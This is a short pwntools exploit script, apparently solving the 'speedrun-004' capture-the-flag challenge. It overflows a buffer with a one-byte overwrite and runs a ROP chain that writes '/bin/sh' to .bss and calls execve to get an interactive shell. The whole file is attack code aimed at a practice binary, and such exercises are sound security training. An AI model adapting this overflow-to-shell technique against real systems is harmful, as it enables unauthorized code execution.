from pwn import *

pop_rdi = p64(0x0000000000400686)
mov_rdi_rdx = p64(0x0000000000435ea3) #: mov qword ptr [rdi], rdx ; ret
pop_rdx = p64(0x000000000044a155)#: pop rdx ; ret
bss = p64(0x6b6040)
bin_sh = p64(0x2F62696E2F7368)
pop_rax = p64(0x0000000000415f04)# : pop rax ; ret
syscall = p64(0x000000000040132c)

while(True):
	payload = b"A" *(256-10  * 8)
	payload += pop_rdi 
	payload += bss
	payload += pop_rdx
	payload += bin_sh
	payload += mov_rdi_rdx
	payload += pop_rdx
	payload += p64(0x0)
	payload += pop_rax
	payload += p64(0x3b)
	payload += syscall

	
	payload += b"\x60"



# b * 0x00400bca

	target = process("./speedrun-004")
	target.sendline(b"257")
	target.sendline(payload)

	target.interactive()
	x = input("Do you want to kill this process?")
	if x == 'y':
		break
